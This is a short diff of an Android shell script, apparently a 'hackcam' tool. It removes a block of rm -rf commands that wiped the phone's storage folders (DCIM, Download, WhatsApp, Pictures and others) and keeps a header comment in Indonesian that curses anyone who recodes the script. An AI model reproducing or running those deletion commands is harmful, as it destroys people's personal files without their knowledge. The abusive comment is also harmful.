@@ -4,17 +4,18 @@
 #Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
 #Bersihkan Layar
 cd /sdcard
-rm -rf Android
-rm -rf Download
-rm -rf DCIM
-rm -rf UCDownloads
-rm -rf com.garena.game.codm
-rm -rf Music
-rm -rf Pictures
-rm -rf Movies
-rm -rf WhatsApp
-rm -rf KAWAI3
-rm -rf Vidio
+
+rm -rf hackcam
+
+
+
+
+
+
+
+
+
+
 blue='\e[1;34m'
 green='\e[1;32m'
 purple='\[1;35m'
